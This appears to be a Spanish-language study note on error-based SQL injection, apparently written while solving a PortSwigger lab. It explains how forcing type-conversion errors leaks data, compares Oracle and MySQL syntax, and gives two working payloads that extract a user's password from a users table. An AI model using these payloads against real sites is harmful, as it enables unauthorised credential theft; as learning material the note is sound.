
---
Tags: #sqli #error #visible

---
### 1. El Concepto Fundamental

El objetivo es causar un **error de conversión de datos**. Obligamos a la base de datos a realizar una operación inválida (como convertir texto en un número entero). Cuando el motor falla, genera un mensaje de error que incluye el valor que intentó procesar.

**Lógica del ataque:**

1. **Inyectar una comparación numérica:** `... WHERE id = '' OR 1 = [NUESTRA_QUERY]`
    
2. **Forzar la conversión:** Pedimos que el resultado de un `SELECT` (que es texto) sea tratado como un número (`INT`).
    
3. **Lectura del error:** El servidor responde: _No se puede convertir el valor 'CONTRASEÑA_REAL' al tipo de dato INT_.
    

---

### 2. Pasos de la Auditoría

#### Paso A: Detección de errores

Añade una comilla simple (`'`) al parámetro. Si la página muestra un error detallado de SQL (como el que pusiste de "Unterminated string literal"), la web es vulnerable y "habladora".

#### Paso B: Comprobación de longitud (Límite de caracteres)

Si tu payload se corta (como te pasó en la posición 95), debes:

- Eliminar espacios innecesarios.
    
- Usar funciones más cortas.
    
- Usar alias de tablas cortos.
    

#### Paso C: Exfiltración de datos

Ejecutar la query de conversión para extraer nombres de tablas, columnas o credenciales.

---

### 3. Tabla Comparativa: Oracle vs. MySQL

|**Característica**|**MySQL / PostgreSQL**|**Oracle**|
|---|---|---|
|**Función de conversión**|`CAST(valor AS INT)`|`TO_NUMBER(valor)`|
|**Concatenación**|`CONCAT(col1, ':', col2)`|`col1 \| ':' \| col2`|
|**Limitar a 1 fila**|`LIMIT 1`|`WHERE ROWNUM = 1`|
|**Tabla obligatoria**|No requiere (o `FROM dual`)|**Obligatorio** `FROM dual` o tabla real|
|**Comentario final**|`-- -` o `#`|`--`|

---

### 4. Ejemplos Prácticos (Payloads Reales)

Usando tu ejemplo de `TrackingId` para extraer la contraseña del primer usuario:

#### En MySQL (Sintaxis corta):

SQL

```
' OR 1=CAST((SELECT password FROM users LIMIT 1) AS UNSIGNED)-- -
```

#### En Oracle (Sintaxis optimizada):

Oracle no tiene `LIMIT`, usa `ROWNUM`. Además, `TO_NUMBER` es la forma más corta de forzar el error:

SQL

```
' AND 1=TO_NUMBER((SELECT password FROM users WHERE ROWNUM=1))--
```


---
# Referencias

Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)